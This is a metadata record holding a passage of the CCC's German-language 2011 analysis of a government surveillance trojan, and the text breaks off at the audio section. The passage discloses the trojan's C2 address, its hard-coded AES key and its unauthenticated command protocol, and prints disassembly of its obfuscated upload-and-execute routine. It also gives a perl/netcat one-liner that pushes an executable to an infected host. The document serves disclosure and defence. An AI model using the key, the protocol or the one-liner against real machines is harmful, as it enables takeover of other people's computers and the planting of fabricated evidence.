{
    "id": "41484b20-eaed-4b2d-ad66-a2486a963f86",
    "created_at": "2022-10-25T16:48:12.109728Z",
    "updated_at": "2025-03-27T02:05:46.011797Z",
    "deleted_at": null,
    "sha1_hash": "3fb5bde6fcd475b6fc0a488bf6b0b413fc22810b",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 191092,
    "plain_text": "# ANALYSE E IN E R RE G IE R U N G S - M AL W AR E\n\n#### Dem Chaos Computer Club (CCC) wurde Schadsoftware zugespielt, deren Besitzer begründeten Anlaß zu der Vermutung hatten, daß es sich möglicherweise um einen „Bundestrojaner“ handeln könnte. Einen dieser Trojaner und dessen Funktionen beschreibt dieses Dokument, die anderen Versionen werden teilweise vergleichend hinzugezogen.\n\n**Berlin, 8. Oktober 2011**\n\n\n-----\n\nSEI TE 2\n\n## A U FB A U\n\n**Die Malware bestand aus einer Windows-DLL ohne exportierte Routinen. Das ist**\n**für eine DLL ungewöhnlich; erfahrungsgemäß kommt dies so gut wie aus-**\n**schließlich bei Schadsoftware vor.**\n\n**Unsere Untersuchung umfaßt eine statische Analyse im Disassembler und die**\n**praktische Umsetzung der Erkenntnisse in der Implementierung einer eigenen**\n**Kontrollsoftware für den Trojaner.**\n\n**Die IP-Adresse des sogenannten „Command-and-Control-Servers“**\n**(207.158.22.134) war fest in den Trojaner einprogrammiert. Der Server ist**\n**zum Zeitpunkt des Schreibens dieses Berichtes nach wie vor aktiv und erreich-**\n**bar. Aus einem Zeitstempel-Feld konnten wir schließen, daß der Beginn der**\n**dem Trojaner-Einsatz zugrundeliegenden Ermittlung einige Zeit zurückliegt.**\n\n**Für die Außen-Kommunikation verwendet der Trojaner den TCP-Port 443. All-**\n**erdings spricht der Trojaner über diesen Port nicht HTTPS, sondern ein eigenes**\n**Bastel-Protokoll. Daher ist es möglich, die Kommunikation des Trojaners auto-**\n**matisiert zu erkennen und beispielsweise in einer Firewall oder einem IDS zu**\n**identifizieren und zu filtern.**\n\n**Das Protokoll benutzt zwar einen Verschlüsselungsalgorithmus, die Implemen-**\n**tierung erfüllt jedoch bei weitem nicht die gängigen kryptographischen Sicher-**\n**heitsstandards. So wird nur ein symmetrisches Verfahren (AES) im nicht-ver-**\n**ketteten Placebo-Modus „ECB“ verwendet. Der Schlüssel ist zudem fest einpro-**\n**grammiert. Bei anderen Versionen des Trojaners war der identische Schlüssel**\n**im Einsatz. Es werden einzig die Antworten des Trojaners verschlüsselt, eine**\n**Authentisierung der jeweiligen Gegenseite findet nicht statt. Ein zeitgemäßes,**\n**kryptografisches Verfahren zum Schutz der sensiblen Daten, deren Integrität**\n**und Vertraulichkeit wird hier nicht verwendet. Man kann also bestenfalls von**\n**einer Verschleierung der Kommunikation reden.**\n\n**Alle untersuchten Varianten des Trojaners wurden zum Zeitpunkt der Bericht-**\n**erstellung von keinem Antivirus-Programm als Schadsoftware erkannt.**\n\n**Die in den Trojaner eingebauten Funktionen sind das Anfertigen von Screen-**\n**shots und das Abhören von Skype- und anderen VoIP-Gesprächen, allerdings**\n**können auch beliebige Schad-Module nachgeladen und ausgeführt werden.**\n\n\n-----\n\nSEI TE 3\n\n## I N F E K T I O N\n\n**Wir haben keine Erkenntnisse über das Verfahren, wie die Schadsoftware auf**\n**dem Zielrechner installiert wurde. Eine naheliegende Vermutung ist, daß die**\n**Angreifer dafür physischen Zugriff auf den Rechner hatten. Andere mögliche**\n**Verfahren wären ähnliche Angriffe, wie sie von anderer Malware benutzt wer-**\n**den, also E-Mail-Attachments oder Drive-By-Downloads von Webseiten. Es gibt**\n**auch kommerzielle Anbieter von sogenannten Infection Proxies, die genau die-**\n**se Installation für Behörden vornehmen.**\n\n**Sicher können wir sagen, daß bei der Infektion zwei Komponenten installiert**\n**wurden: eine Windows-DLL im Userland c:\\windows\\system32\\mfc42ul.dll**\n**sowie ein Windows-Kernel-Modul namens winsys32.sys.**\n\n**Das Laden und Ausführen des DLL-Codes wird über den Registry-Key**\nSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs\n**realisiert, das Kernel-Modul wird über einen Windows-Kernel-Modul-Service**\n**vom Betriebssystem geladen.**\n\n**Das Kernel-Modul liegt in Form einer unsignierten 32-bit-Datei vor. Es kann**\n**daher in dieser Form nur auf einem 32-bit-Windows funktionieren. Uns liegen**\n**keine Erkenntnisse vor, ob es auch eine 64-bit-Version gibt. Dies wäre daher**\n**interessant, da 64-bit-Versionen zwangsläufig signiert sein müssen. Über die**\n**Signatur könnte man eventuell Rückschlüsse auf den Urheber der Software**\n**ziehen.**\n\n## K O M M U NIK AT ION MIT K OMMANDO Z ENTR AL E\n\n**Beim regulären Laden einer Windows-DLL wird zumindest die DLL-Main-Routine**\n**verarbeitet, hierin werden die ersten, initialen Schadroutinen ausgeführt, die**\n**dafür sorgen, daß aktuell laufende Prozesse infiziert werden. Unter anderem**\n**dockt sich die Schadsoftware an den Prozeß explorer.exe an und baut von hier**\n**aus die Verbindung zum Kontrollserver auf.**\n\n**Der in den uns vorliegenden Trojanern hart einkodierte Command-and-Control-**\n**Server (C+C-Server) befindet sich auf der IP 207.158.22.134. Diese IP liegt im**\n**Rechenzentrum des kommerziellen Hosting-Anbieters Web Intellects in Colum-**\n**bus, Ohio, USA.**\n\n\n-----\n\nSEI TE 4\n\n## V ER S CHL Ü SSE LUNG\n\n**Wir haben in der DLL das bekannte Block-Cipher-Verfahren AES gefunden. Es**\n**wird für die Verschlüsselung der ausgehenden Daten verwendet. Da AES ein**\n**symmetrisches Verfahren ist, müssen Sender und Empfänger denselben gehei-**\n**men Schlüssel besitzen und sind für Dritte kryptographisch nicht unterscheid-**\n**bar. Der AES-Schlüssel ist in allen von uns untersuchten Varianten des Troja-**\n**ners gleich. Er lautet:**\n\n49 03 93 08 19 94 96 94 28 93 83 04 68 28 A8 F5\n0A B9 94 02 45 81 93 1F BC D7 F3 AD 93 F5 32 93\n\n**Auffällig an dem gefundenen AES-Code ist, daß nur die Verschlüsselung im-**\n**plementiert wurde, nicht aber die für die Entschlüsselung benötigte Decryption**\n**Key Derivation. Außerdem werden in dem benutzten ECB-Modus alle 16-Byte-**\n**Blöcke mit demselben Schlüssel ver- und wieder entschlüsselt. Im Klartext:**\n**Identischer Input erzeugt identischen Output.**\n\n**Wie bereits erwähnt wird nur eine Richtung der Kommunikation verschlüsselt,**\n**nämlich die Antworten des Trojaners. Wichtiger als die Ver-schlüsselung ist für**\n**einen Kommandokanal aber die Authentisierung. Der Trojaner implementiert**\n**hier keinerlei Schutz gegen Manipulationen. Es gibt lediglich einen fest einko-**\n**dierten Banner-String, und zwar**\n\nC3PO-r2d2-POE\n\n**Dieser wird jedoch vom Trojaner zum Server geschickt und nicht andershe-**\n**rum. Ein Angreifer muß ihn also nicht kennen oder entschlüsseln können, um**\n**den Trojaner übernehmen zu können, denn die Gegenrichtung, also die Kom-**\n**mandos an den Trojaner und ihre Parameter, sind gänzlich ungesichert und**\n**können von Dritten frei eingesehen oder manipuliert werden.**\n\n**Durch die unzureichende Verschlüsselung ergibt sich aus diesem Banner ein**\n**konstanter Byte-String am Anfang der Trojaner-Kommunikation, an dem man**\n**den Trojaner-Rückkanal automatisiert in einem IDS oder IPS erkennen, heraus-**\n**filtern bzw. Alarm schlagen kann.**\n\n**Diese beiden Punkte sind besonders brisant, weil eine der manipulierbaren**\n**Funktionen das Hochladen und Ausführen eines weiteren Programmes ist (sie-**\n**he unten). Es ist daher ein Leichtes, ein einmal identifiziertes, mit diesem Tro-**\n**janer infiziertes System zu übernehmen und beispielsweise mit anderer Schad-**\n**software zu befüllen.**\n\n\n-----\n\nSEI TE 5\n\n**Zur Veranschaulichung: Bei einer solchen Übernahme würde man einfach die**\n**ersten 65 Bytes (Banner und Informationen wie die Fall-Nummer) aus der Ver-**\n**bindung des Trojaners abwarten und ihm danach einen Befehl der Form**\n\\x0e <Länge der Parameter> <Parameter> <Länge des Executables> <Executable>\n**zuschicken. Hierfür muß man nicht einmal den AES-Schlüssel kennen.**\n\n**Die fehlende Authentisierung ermöglicht die folgenden Angriffsszenarien:**\n\n**1.) Ein Dritter versucht, die Zielperson mit falschen Beweisen zu belasten. Da-**\n**für meldet er sich am C+C-Server als das Zielsystem an und liefert gefälschte**\n**Beweise an die Ermittlungsbehörden. Dieses Szenario ist sehr einfach zu im-**\n**plementieren.**\n\n**2.) Ein Dritter manipuliert den Netzwerkverkehr zwischen Zielperson und C+C-**\n**Server und gibt sich dem Trojaner gegenüber als der C+C-Server aus. Solche**\n**Möglichkeiten ergeben sich teilweise in öffentlichen (WLAN) oder anderweitig**\n**kompromittierbaren Netzwerken. Es wäre auch denkbar, daß ein Standort vor-**\n**sorglich an der Firewall einen solchen Service installiert, um Teilnehmer im ei-**\n**genen Netz vor Abhörversuchen zu schützen. In beiden Fällen besitzen Dritte**\n**die Möglichkeit, beliebige Programme auf dem System der Zielperson auszu-**\n**führen, der Person gefälschte Beweise unterzuschieben oder ihre Daten zu lö-**\n**schen oder zu manipulieren.**\n\n**3.) Da es auch zwischen den beiden Software-Komponenten des Trojaners keine**\n**Authentisierung gibt, gelten ähnliche Angriffsmöglichkeiten auch innerhalb des**\n**Rechners. Eine Schadsoftware kann sich mit Hilfe des Kernel-Moduls erhöhte**\n**Zugriffsrechte auf dem Zielsystem verschaffen, einfach indem sie das Kernel-**\n**Modul darum „bittet“. Ohne diese Hintertür bräuchte man Kenntnis einer aktu-**\n**ellen „local privilege escalation“-Sicherheitslücke, für die auf dem Schwarz-**\n**markt vier- bis fünfstellige Euro-Beträge verlangt werden.**\n\n## B E WE R T U NG\n\n**Der Einsatz von AES in dem gezeigten katastrophalen Gesamtumfeld – ohne**\n**Session-Keys, mit ECB, und nur in eine Richtung – deutet auf Ausschreibungen**\n**im öffentlichen Sektor hin, bei denen AES gefordert wurde, aber der Rest nicht**\n**spezifiziert war. Mehr als einen Bonuspunkt in der B-Note können wir hier lei-**\n**der nicht vergeben.**\n\n**Wir sind hocherfreut, daß sich für die moralisch fragwürdige Tätigkeit der Pro-**\n**grammierung der Computerwanze keine fähiger Experte gewinnen ließ und die**\n**Aufgabe am Ende bei studentischen Hilfskräften mit noch nicht entwickeltem**\n**festen Moralfundament hängenblieb.**\n\n\n-----\n\nSEI TE 6\n\n**Auf der anderen Seite sind wir erschüttert, daß ein solches System bei der Qua-**\n**litätssicherung auch nur durch das Sekretariat kommen konnte. Anfängerfehler**\n**dieser Größenordnung hätten im Vorfeld unterbunden werden müssen, zumal**\n**bereits bei der Anhörung vor dem Bundesverfassungsgericht anläßlich des Be-**\n**schwerdeverfahrens gegen die Online-Durchsuchung von Regierungsseite im-**\n**mer wieder versichert wurde, daß besonders hohe Qualitätssicherungsansprü-**\n**che gestellt würden. Man sprach gar davon, daß die Spionagesoftware indivi-**\n**dualisiert an den Zielrechner angepaßt würde. Diese hehren Ziele sind offenbar**\n**Sparmaßnahmen bei den Behörden zum Opfer gefallen.**\n\n**Das vollumfängliche Eintreffen unsere Voraussage, daß ein Staatstrojaner zu-**\n**sätzliche klaffende Sicherheitslücken in die Zielrechner reißen würde, über-**\n**raschte angesichts der ausführlichen Diskussionen schon etwas, erfüllt uns je-**\n**doch angesichts der potentiellen Schäden für Betroffene kaum mit Genugtuung.**\n\n**Wir möchten darauf hinweisen, daß für die Zielpersonen die Unschuldsvermu-**\n**tung und für ihre Rechner das Grundrecht auf Vertraulichkeit und Integrität**\n**informationstechnischer Systeme gilt. Es ist für uns unbegreiflich, wie ein sol-**\n**cher Trojaner die vertraulichen und möglicherweise aus dem zu schützenden**\n**Kernbereich der privaten Lebensgestaltung stammenden Daten durch ein Dritt-**\n**land leiten kann, zumal noch ein in Fragen der Menschenrechte schlecht be-**\n**leumundetes. Durch die Umleitung der Daten durch ein Land außerhalb der Ju-**\n**risdiktion der EU wird dem betroffenen Bürger möglicherweise auch ein wirk-**\n**samer Rechtsbehelf verwehrt.**\n\n**Besonders die Privatsphäre, aber auch Wirtschaftsgeheimnisse sind schützens-**\n**wert. Das hier vorliegende Schadprogramm geht grob fahrlässig mit den sensib-**\n**len abgeschnorchelten Daten um. Insbesondere entsetzt der Umstand der**\n**Durchreichung der unzureichend gesicherten Daten durch ein nicht näher kon-**\n**trolliertes Netzwerk.**\n\n**Angesichts der katastrophal gescheiterten Mechanismen zur Einhaltung von**\n**Mindeststandards bezüglich der kryptographischen Absicherung sensibler Da-**\n**ten stellt sich auch die folgende Frage: Wie stehen die Verantwortlichen zu der**\n**Tatsache, daß die möglicherweise sensiblen Daten ausgespähter deutscher**\n**Bürger und Firmen durch die Netzwerke eines Landes geleitet werden, welches**\n**aktiv Wirtschaftsspionage in Deutschland betreibt? Wieso werden die Daten**\n**nicht über einen virtuellen Server etwa bei 1&1 oder Strato unter deutscher**\n**Jurisdiktion geleitet?**\n\n\n-----\n\nSEI TE 7\n\n## V ER B I N D U NGSAUFB AU UND DATENSTR UKTUR EN\n\n**Ein nicht verbundener Client versucht in unregelmäßigen Abständen, sich per**\n**TCP zum Server zu verbinden. Bei Erfolg sendet er ein Null-Byte und einen**\n**Header von 64 Byte Länge. Ist der C+C-Server an den Daten interessiert, sollte**\n**er sie entschlüsseln.**\n\n**Der Klartext des Paketes beginnt immer mit dem Magic C3PO-r2d2-POE**\n\n**Die ersten Bytes des Klartext-Headers:**\n\n00000  43 33 50 4f 2d 72 32 64  32 2d 50 4f 45 00 99 96  C3PO-r2d2-POE\n00010  07 00 00 00 1b c7 9b dc  5d 88 3d e1 57 a6 dd 7c      ] = W |\n00020  32 33 43 43 43 32 33 00 35 0f d8 04 a1 c2 f2 df  23CCC23 5\n...\n\n**Nach dieser Begrüßung sendet der Client regelmäßig 16 Bytes lange Idle-Pakete**\n**der Form:**\n\n00000  11 26 80 7c ff ff ff ff 00 26 80 7c 42 25 80 7c  .&.|.....&.|B%.|\n\n**Einmal verbunden kann der Server Befehle an den Client senden. Diese Kom-**\n**mandos bestehen aus einem Byte Command-Identifier und einer variablen**\n**Menge von Parametern. Sie werden weiter unten aufgelistet.**\n\n**Der Client antwortet auf einen Befehl mit einem 16 Bytes langen Header, an**\n**dessen erster Position meist ein Response Code steht. Dieser Response Code,**\n**beispielsweise im Falle eines Idle-Feedbacks 0x11, das Byte 0x16, signalisiert**\n**dem Server, daß sogleich ein JPEG-kodiertes Bildschirm-Foto gesendet wird.**\n0x28 gibt an, daß es gerade keine Fotos gibt (zum Beispiel, weil kein Browser**oder Skype-Fenster im Vordergrund, der Bildschirmschoner aktiv oder das**\n**Fenster teilweise verdeckt ist), und 0x23 signalisiert: „Dein soeben hochgela-**\n**denes Executable wurde ausgeführt“.**\n\n**Nach dem Header folgen Response-abhängige Daten dynamischer Länge, etwa**\n**der angeforderte Screenshot oder ausgeleitete Audiofragmente.**\n\n**Im Trojaner gibt für die Kommandos vom Server eine Kommando-Dispatcher-**\n**Routine mit einem großen Switch-Statement. Wir konnten einen Großteil der**\n**Funktionalitäten identifizieren, die Funktion einiger einzelner Kommandos ist**\n**aber noch unklar. Teilweise werden in den Routinen lediglich Werte geparsed**\n**und in verschiedene Datenstrukturen geschrieben. Wir nehmen an, daß hier**\n**indirekt Aktionen getriggert und/oder das Laufzeitverhalten des Trojaners**\n**konfiguriert werden kann.**\n\n**Die genaue Verwendung der Datenstrukturen, die durch diese unbekannten**\n**Kommandos verändert wurden, konnte aufgrund der Komplexität noch nicht**\n\n\n-----\n\nSEI TE 8\n\n**sinnvoll nachvollzogen werden, daher bleiben diese im Rahmen dieser Doku-**\n**mentation zunächst außen vor. Es würde uns freuen, wenn sich Interessierte**\n**der von uns bereitgestellten Ressourcen bedienten und gemeinsam die fehlen-**\n**den Punkte zusammentrügen – gern vollkommen anonym und verschlüsselt an**\n**die E-Mailadresse 0zapftis@ccc.de mit dem PGP-Key am Ende des Berichtes.**\n\n**Hier die bislang identifizierten Kommandos aus der Dispatcher-Routine:**\n**\"--\" bedeutet, daß das Kommando von der Routine nicht behandelt wird.**\n**\"?\" bedeutet, daß bislang unklar ist, was für Auswirkungen das Kommando auf**\n**den Programmverlauf hat.**\n\ncmd 1: -\ncmd 2: Client verbindet sich neu und versucht danach, bisher unbekannte Daten abzusetzen,\nCode ist ähnlich wie cmd 13\n\ncmd 3: Screencast geringer Bildqualität über eine bestimmte Zeit, wie cmd 9, nur mit einem\nArgument\n\ncmd 4: Registrieren des Kernelmode-Treibers im Betriebssystem\n\ncmd 5: Installation aller trojanerspezifischen Dateien im Dateisystem; noch ist nicht eindundertprozentig klar, woher die Daten genau kommen, möglicherweise gibt es noch\neine Upload-Funktion ähnlich cmd 14\n\ncmd 6: Löschen der Trojaner-Daten vom Dateisystem & Reboot\n\ncmd 7: Entladen des Trojaners\n\ncmd 8: Liste mit allen Softwarekomponenten und Patches\n\ncmd 9: wie cmd 3, aber mit drei Argumenten\n\ncmd 10: -\ncmd 11: -\ncmd 12: Setzen irgendwelcher Werte (sechs Integer-Werte, geparsed via sscanf)\n\ncmd 13: Screenshot von Webbrowser und Skype\n\ncmd 14: Upload eines Programmes und dessen unmittelbare Ausführung\n\ncmd 15: -\ncmd 16: ?\n\ncmd 17: ?\n\ncmd 18: Return 0\n\n\n-----\n\nSEI TE 9\n\n**Da wir uns zunächst auf das große Gesamtbild und einzelne besonders frag-**\n**würdige Methoden konzentriert haben, sind einige Kommandos auf der Strecke**\n**geblieben. Über die Vervollständigung der Dokumentation durch die Communi-**\n**ty wären wir froh. Wir nehmen außerdem gern weitere Trojaner-Samples oder**\n**auch Quell-Code in braunen oder bunten Umschlägen oder per E-Mail an**\n```\n0zapftis@ccc.de entgegen (PGP-Key am Ende des Dokuments).\n\n## SCR E E N S H OT- ME CHANISM EN\n\n```\n**Der C+C-Server kann auf verschiedenen Wegen Screenshots vom Client-PC an-**\n**fordern. Die beiden Kommandos 2 und 13 unterscheiden sich anscheinend nur**\n**in der Anzahl der Parameter, die übergeben werden.**\n\n**Screenshots werden offenbar standardmäßig (wir haben bislang keinen Weg**\n**drumherum gefunden) lediglich von den Fenstern mit Fokus gemacht, sofern**\n**eine White-List mit Prozeßnamen auf das Fenster zutrifft. Derzeit können wir**\n**zwar nicht ausschließen, daß es noch einen nativen Weg gibt, Screenshots vol-**\n**ler Bildschirmgröße anzufertigen, aber zunächst scheint ein Check mittels**\nIsWindow() zu Beginn einer Screenshot-Routine zu greifen:\n\n...\n\n.text:1000A410 000    sub   esp, 6Ch\n\n.text:1000A413 06C    push  ebx\n\n.text:1000A414 070    mov   ebx, ecx\n\n.text:1000A416 070    mov   eax, [ebx+20h]\n\n.text:1000A419 070    push  eax            ; hWnd\n\n.text:1000A41A 074    call  ds:IsWindow\n\n.text:1000A41A\n\n.text:1000A420 070    test  eax, eax\n\n.text:1000A422 070    jnz   short loc_1000A42D\n\n.text:1000A422\n\n.text:1000A424 070    xor   al, al\n\n.text:1000A426 070    pop   ebx\n\n.text:1000A427 06C    add   esp, 6Ch\n\n.text:1000A42A 000    retn  18h\n\n\n-----\n\nSEI TE 10\n\n**Wird ein Screenshot vom Client angefordert, geschieht dies durch das Senden**\n**des Befehls 0x0d mit zweimal 4 Byte langen Argumenten, beispielsweise: 0D FF**\nFF FF FF FF FF FF FF. Nur zur Erinnerung: Alles was der C+C-Server an den Cli**ent-PC sendet, ist unverschlüsselt.**\n\n**Der Client antwortet hierauf entweder mit einem**\n\n28 26 80 7c ff ff ff ff 00 26 80 7c 42 25 80 7c\n\n**falls keine Bilddaten gesendet werden – oder z. B. mit**\n\n16 26 80 7c ff ff ff ff 00 26 80 7c 42 25 80 7c\n\nss ss ss ss ff ff ff ff 00 26 80 7c 42 25 80 7c\n\n**falls ein JPEG-kodiertes Bild folgt. Die mit „s“ markierten Bytes beinhalten die**\n**Größe der zu übertragenden Bild-Daten. Nach dem Empfang eines solchen Hea-**\n**ders sollten genau „ss ss ss ss“ Bytes gelesen werden.**\n\n## B E WE R T U NG\n\n**Hier ist rechtlich und ethisch einiges in der Grauzone. Es ist beispielsweise**\n**ausgesprochen fragwürdig, bei einer Telekommunikationsüberwachung**\n**Screenshots eines E-Mail-Programmes oder anderer Editoren für eine Beweissi-**\n**cherung anzufertigen, da nicht nachgewiesen werden kann, ob die Texte über-**\n**haupt versendet wurden, also eine Kommunikation stattfand.**\n\n**Alles, was im aktiven Bildschirmfenster passiert, zu Kommunikation umzude-**\n**finieren und dann mit einer „Quellen-TKÜ“ abzugreifen, sollte auch intellektuell**\n**weniger Begabten als dreiste Nummer ins Auge fallen. Eine**\n**E-Mail kann nach dem Verfassen nochmals überarbeitet und anderslautend ver-**\n**schickt worden sein, oder der Benutzer kann es sich auch anders überlegen**\n**und die E-Mail verwerfen. Und daß nebenher per Screenshot auch noch aufge-**\n**zeichnet wird, was der Betroffene sonst so anklickt, grenzt an staatlichen**\n**Voyeurismus.**\n\n**Letztlich erfaßt die Schadsoftware Gedankengänge des Computerbenutzers.**\n**Sein digitales Tagebuch, erstellt mit einer browserbasierten Textverarbeitung,**\n**enthält Überlegungen, die vielleicht nie seine Festplatte verlassen sollten, aber**\n**durch den Einsatz der Computerwanze als belastendes Indiz herangezogen**\n**werden können. Wenn das kein Eingriff in die digitale Intimsphäre ist, was**\n**dann?**\n\n\n-----\n\nSEI TE 11\n\n**Selbst wenn es hier klare rechtliche Regularien und eventuell sogar fachkundi-**\n**ge, unabhängige Überprüfungen der Trojaner-Software gäbe: Ein großer Teil**\n**der Bürger nutzt mehr und mehr sogenannte Cloud-Dienste über Webbrowser**\n**und verfaßt etwa E-Mails, Tagebücher, Berichte und Kalendereinträge online.**\n**Google geht diese Richtung noch einen Schritt weiter und bietet ein vollkom-**\n**men Webbrowser-basiertes Betriebssystem an.**\n\n**Für einen Teil der Menschen wird es also langfristig keine Trennung zwischen**\n**on- und offline verfaßten Texten mehr geben, die für die Behörden durch den**\n**„Quellen-Telekommunikationsüberwachungs“-Trojanereinsatz offenlägen.**\n**Schon jetzt haben mit HTML5 lokale Datenbankzugriffe Einzug in die Browser**\n**gefunden, so daß man auch lokale Anwendungen komplett nativ in einem**\n**Webbrowser realisieren kann, die dann ebenfalls per Browser-Screenshot über-**\n**wacht werden können.**\n\n## HI N T E R T Ü R IN DE R HINT ER T Ü R\n\n**Laut Aussage der Behörden, die diese Schadsoftware einsetzen, und laut der**\n**Angaben im Rahmen der Anhörung vor dem Bundesverfassungsgericht, wer-**\n**den die Programme für jeden Einzelfall individuell zusammengestellt. Jede**\n**Funktionalität soll richterlich abgesegnet sein.**\n\n**Diese Aussage erscheint uns nicht glaubwürdig, weil die hartkodierten Schlüs-**\n**sel und Dateinamen in allen untersuchten Trojaner-Varianten identisch waren.**\n**Außerdem fanden wir noch Reste von Code für unbenutzte Funktionalität in**\n**den Binaries. Wenn hier also für jede Anwendung spezifisch ein Trojaner ange-**\n**fertigt wird, dann kann die Durchführung nur als dilettantisch bezeichnet wer-**\n**den.**\n\n**Wir fanden außerdem prompt eine Hintertür in der Hintertür – also einen Bun-**\n**destrojaner-Funktionserweiterer, der vorbei an jeder Kontrolle etwaig invol-**\n**vierter Ermittlungsrichter nativ die Möglichkeit zur Verfügung stellt, die**\n**Schadsoftware mit weiteren Funktionalitäten anzureichern.**\n\n\n-----\n\nSEI TE 12\n\n## UPL O A D - UND E X E CUT E - M EC H ANISMUS\n\n**Zunächst wird der entsprechende Befehl zum Hochladen eines Programmes im**\n**Kommando-Dispatcher nicht versteckt. Er ist einfach da, und er kann getriggert**\n**werden:**\n\n.text:100064C1\n; --------------------------------------------------------------------------.text:100064C1\n.text:100064C1   perl -e 'print \"\\x0e\" . \"\\x10\\x00\\x00\\x00\" . \"B\" x 16 .\n\"\\x00\\xc0\\x01\\x00\" . `cat calc.exe`;' | nc -v -l 6666 | hexdump -C\n.text:100064C1\n.text:100064C1   cmd_disp_case14:            ; CODE XREF: _0zapftis_process_remotemessage+31j\n.text:100064C1                       ; DATA XREF:\n.text:__0zapftis_init_cmd_dispatchero\n.text:100064C1 014    mov   edx, [esi]        ; jumptable 100063A1 case\n14\n.text:100064C3 014    mov   ecx, esi\n.text:100064C5 014    call  dword ptr [edx+2Ch]\n.text:100064C5\n.text:100064C8 014    jmp   short loc_100064F9\n\n**Der letztlich ausgeführte Code beinhaltet das Speichern der Datei**\n\n.text:1000D4F1 438    call  ds:GetTempPathA\n.text:1000D4F1\n.text:1000D4F7\n.text:1000D4F7   loc_1000D4F7:              ; CODE XREF: _0zapftis_download_store_EXE+BBj\n.text:1000D4F7 430    mov   eax, tmp_file_index\n.text:1000D4FC 430    lea   edx, [esp+430h+FileName]\n.text:1000D500 430    mov   ecx, eax\n.text:1000D502 430    inc   eax\n.text:1000D503 430    push  ecx\n.text:1000D504 434    lea   ecx, [esp+434h+Buffer]\n.text:1000D50B 434    push  ecx\n.text:1000D50C 438    push  offset aSTmp08x_exe    ; \"%s~tmp%08x~.exe\"\n.text:1000D511 43C    push  edx            ; Destination Buffer <zu eng :-)\n.text:1000D512 440    mov   tmp_file_index, eax\n.text:1000D517 440    call  _sprintf\n.text:1000D517\n.text:1000D51C 440    lea   eax, [esp+440h+FileName]\n.text:1000D520 440    push  eax            ; lpFileName\n.text:1000D521 444    call  _0zapftis_create_file\n...\n\n\n-----\n\nSEI TE 13\n\n**und das anschließende Ausführen:**\n\n.text:1000D5FA 430    push  0\n.text:1000D5FC 434    push  0             ; narf. Wenn das 1 wäre,\ndann wird code ausgefuehrt\n.text:1000D5FE 438    push  1\n.text:1000D600 43C    lea   eax, [esp+43Ch+var_214]\n.text:1000D607 43C    push  0\n.text:1000D609 440    lea   ecx, [esp+440h+FileName]\n.text:1000D60D 440    push  eax\n.text:1000D60E 444    push  ecx\n.text:1000D60F 448    call  _0zapftis_file_execute  ; shell execute\n...\n\n**Die hier der Funktion _0zapftis_file_execute() übergebenen Argumente werden**\n**teilweise an die Windows-API ShellExecuteA() weitergegeben. Wäre das zweite**\n**Argument – wie oben zu sehen – eine 1, würde die Datei direkt von ShellExecute**\n**ausgeführt werden. Betrachtet man jedoch die Funktion _0zapftis_file_execu-**\nte() noch ein zweites Mal genauer, stellt man sehr schnell fest, daß hier etwas\n**versteckt werden sollte.**\n\n\n-----\n\nSEI TE 14\n\n**Ausführen einer hochgeladenen Datei:**\n\n.text:10003C81 0E4    mov   esi, offset aCrea     ; \"Crea\"\n...\n.text:10003D29 0E4    mov   edi, offset aTeproc    ; \"teProc\"\n...\n.text:10003D9E 0E4    push  offset aKernel32     ; \"Kernel32\"\n.text:10003DA3 0E8    call  ds:GetModuleHandleA\n...\n.text:10003DBE 0E4    mov   edi, offset aEssa     ; \"essA\"\n...\n.text:10003E1C 0F0    call  ?append@?$basic_string@...\n...\n.text:10003E5D 0EC    call  ds:GetProcAddress\n.text:10003E5D\n.text:10003E63 0E4    test  eax, eax\n.text:10003E65 0E4    jz   loc_10003F51\n.text:10003E65\n.text:10003E6B 0E4    lea   ecx, [esp+0E4h+var_60]\n.text:10003E72 0E4    lea   edx, [esp+0E4h+var_50]\n.text:10003E79 0E4    push  ecx            ; lpProcessInformation\n.text:10003E7A 0E8    mov   ecx, [esp+0E8h+arg_4]\n.text:10003E81 0E8    push  edx            ; lpStartupInfo\n.text:10003E82 0EC    mov   edx, [esp+0ECh+arg_0]\n.text:10003E89 0EC    push  0             ; lpCurrentDirectory\n.text:10003E8B 0F0    push  0             ; lpEnvironment\n.text:10003E8D 0F4    push  4000000h       ; dwCreationFlags\n.text:10003E92 0F8    push  0             ; bInheritHandles\n.text:10003E94 0FC    push  0             ; lpThreadAttributes\n.text:10003E96 100    push  0             ; lpProcessAttributes\n.text:10003E98 104    push  ecx            ; CmdLine\n.text:10003E99 108    push  edx            ; AppName\n.text:10003E9A 10C    call  eax            ; CreateProcessA()\n\n**Wie in oben schnell ersichtlich wird, wurde die Zeichenkette**\nCreateProcessA in mehrere Teile zerlegt und an verschiedenen, scheinbar zufäl**ligen Positionen innerhalb der Funktion wieder zusammengesetzt. Nach dem**\n**Zusammensetzen der Zeichenkette mit dem Funktionsnamen wird die**\n**Windows-Laufzeitbibliothek geladen (kernel32.dll), um einen Funktionspointer**\n**auf die exportierte Windows-API CreateProcessA zu laden. Letztere ist – wie der**\n**Name schon verspricht – geeignet, um einen neuen Prozeß zu erzeugen. Hierfür**\n**wird der Pfad auf das zuletzt hochgeladene Executable sowie die per Komman-**\n**do 0x0E übergebenen Parameter verwendet, um die Datei auszuführen.**\n\n**Hierüber können beliebige weitere Programme ausgeführt werden, die es etwa**\n**erlauben, beliebig auf den Inhalt der Festplatte einzuwirken.**\n\n\n-----\n\nSEI TE 15\n\n## B E WE R T U NG\n\n**Die Verschleierung der CreateProcessA-Funktion kann verschiedene Gründe**\n**haben: das Umgehen von Antiviren-Programmen, die einen solchen API Call**\n**rein heuristisch negativ bewerten, oder aber das plumpe Verstecken einer Hin-**\n**tertür und Täuschen von Auditoren. Wir halten beide Varianten für plausibel,**\n**denn immerhin ist diese Funktionalität eindeutig rechtswidrig im Kontext einer**\n**„Quellen-TKÜ“. Ferner muß ganz klar gesagt werden: Wer auch immer das ver-**\n**steckt hat, er oder sie wußte ganz genau, warum und was versteckt werden**\n**sollte – offensichtlich waren sich die Verantwortlichen ihres Handelns durch-**\n**aus bewußt.**\n\n## E X P L O I T AT ION\n\n**Wir haben es uns nicht nehmen lassen, die Hintertür in der Hintertür auch in**\n**unserer eigenen C+C-Server-Konsole zu implementieren. Dadurch sind wir bei-**\n**spielsweise in der Lage, eine Raumüberwachung (aka „Großer Lauschangriff“)**\n**zu starten oder Beweise zu fälschen.**\n\n\n-----\n\nSEI TE 16\n\n## A U D I O - A U FZE 